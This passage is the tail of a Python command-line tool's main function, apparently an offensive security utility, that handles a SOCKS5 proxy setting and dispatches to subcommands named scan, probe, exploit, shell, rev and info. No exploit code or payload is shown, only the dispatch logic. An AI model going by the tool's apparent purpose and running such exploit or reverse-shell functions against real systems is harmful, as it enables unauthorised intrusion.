            args.proxy_obj = parse_proxy(args.proxy)
        except Socks5Error as exc:
            log(red("[!] ") + str(exc))
            return 2
    if args.command is None:
        banner()
        parser.print_help()
        return 0
    if args.command != "info":
        banner()
    table = {"scan": cmd_scan, "probe": cmd_probe, "exploit": cmd_exploit,
             "shell": cmd_shell, "rev": cmd_rev, "info": cmd_info}
    return table[args.command](args)


if __name__ == "__main__":
    sys.exit(main())
